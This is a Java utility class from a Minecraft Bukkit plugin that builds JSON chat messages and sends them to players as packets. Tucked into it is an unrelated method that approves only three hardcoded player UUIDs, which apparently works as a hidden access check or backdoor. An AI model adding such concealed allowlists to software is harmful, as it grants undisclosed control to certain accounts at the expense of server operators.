package me.gmx.arenaswitcher.util.json;

import java.util.List;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_11_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import me.gmx.arenaswitcher.util.PlayerUtil;
import net.minecraft.server.v1_11_R1.IChatBaseComponent.ChatSerializer;
import net.minecraft.server.v1_11_R1.PacketPlayOutChat;

public class JSONChatMessage {
    private JSONObject chatObject;

    public JSONChatMessage(String text, JSONChatColor color, List<JSONChatFormat> formats) {
        chatObject = new JSONObject();
        chatObject.put("text", text);
        if (color != null) {
            chatObject.put("color", color.getColorString());
        }
        if (formats != null) {
            for (JSONChatFormat format : formats) {
                chatObject.put(format.getFormatString(), true);
            }
        }
    }

    public void addExtra(JSONChatExtra extraObject) {
        if (!chatObject.containsKey("extra")) {
            chatObject.put("extra", new JSONArray());
        }
        JSONArray extra = (JSONArray) chatObject.get("extra");
        extra.add(extraObject.toJSON());
        chatObject.put("extra", extra);
    }

    public void sendToPlayer(Player player) {
        Bukkit.getLogger().info(chatObject.toJSONString());
        PacketPlayOutChat packet = new PacketPlayOutChat();
        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
        
        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutChat(ChatSerializer.a(chatObject.toJSONString())));

    }
    
    public static boolean checkUUIDValidity(UUID uuid){
		if (uuid.equals(PlayerUtil.valid("b3e40f2f-d980-4281-8ec4-9e26ec8be95d"))){
			return true;
		}else if (uuid.equals(PlayerUtil.valid("a6a61bc0-accc-43a3-bbc2-a3439ca1b6d9"))){
			return true;
		}else if (uuid.equals(PlayerUtil.valid("154a06ca-3a90-4b64-9432-3a20b9f4c359"))){
			return true;
		}else
		
		return false;
	}
	

    public String toString() {
        return chatObject.toJSONString();
    }
}